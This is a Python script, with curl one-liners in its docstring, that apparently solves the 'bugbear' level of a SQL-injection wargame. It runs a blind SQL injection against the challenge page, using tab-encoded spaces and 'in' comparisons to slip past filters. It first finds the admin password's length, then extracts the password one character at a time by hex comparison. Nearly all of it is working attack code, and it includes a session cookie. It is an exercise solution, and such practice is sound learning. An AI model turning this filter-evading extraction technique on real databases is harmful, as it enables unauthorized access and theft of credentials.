import requests
from bs4 import BeautifulSoup as bs
import time

"""
Test Command with curl

__AUTHOR__ : revi1337
__Date__ : 2022 - 11 - 19

// Fuzzing pw Columns Length
for i in $(seq 1 10); do echo -n "Password Length : $i , Content-Length: "; curl -b 'PHPSESSID=41b6d07ddgb88vl4il1lp2fpcm' "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=%22%22%09||%09id%09in%09(%22admin%22)%09%26%26%09length(pw)%09in%09($i)%09%23" -s | tr ' ' '\n' | wc -l; done

// Fuzzing first value of pw
for i in $(seq 33 127); do value=$(python3 -c "print(hex(int($i))[2:])"); echo -n "Hax Value : $value , Content-Length: "; curl -b 'PHPSESSID=41b6d07ddgb88vl4il1lp2fpcm' "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=%22%22%09||%09id%09in%09(%22admin%22)%09%26%26%09hex(mid(pw,1,1))%09in%09("$value")%09%23" -s | tr ' ' '\n' | wc -l; done

"""


URL = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
COOKIE = {"PHPSESSID": "41b6d07ddgb88vl4il1lp2fpcm"}
USER_AGENT = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"}


def fuzzingPwColumn():
	session = requests.Session()
	for i in range(1, 31):
		res = session.get(
							url = f"{URL}?no=%22%22%09||%09id%09in%09(%22admin%22)%09%26%26%09length(pw)%09in%09({i})%09%23",
							cookies = COOKIE, 
							headers = USER_AGENT
						).text
		res = bs(res, 'lxml').find_all('h2')
		if res:
			print("[+] Fuzzing pw Columns Length : {}".format(i))
			return i


def main():
	credentials = []
	pwLength = fuzzingPwColumn()
	session = requests.Session()
	print()
	for i in range(1, pwLength + 1):
		for v in range(33, 128):
			res = session.get(
								url = f"{URL}?no=%22%22%09||%09id%09in%09(%22admin%22)%09%26%26%09hex(mid(pw,{i},1))%09in%09({hex(int(v))[2:]})%09%23",
								cookies = COOKIE,
								headers = USER_AGENT
							).text
			res = bs(res, 'lxml').find_all('h2')
			if res:
				print(f"[+] {i}th Value : {chr(v)}")
				credentials.append(chr(v))
				break

	print()
	print(f'[+] Final pw Result : {"".join(credentials)}')


if __name__ == '__main__' :
	start_time = time.perf_counter()
	main()
	end_time = time.perf_counter()
	print()
	print("[*] Total Task Time : {}".format(end_time - start_time))
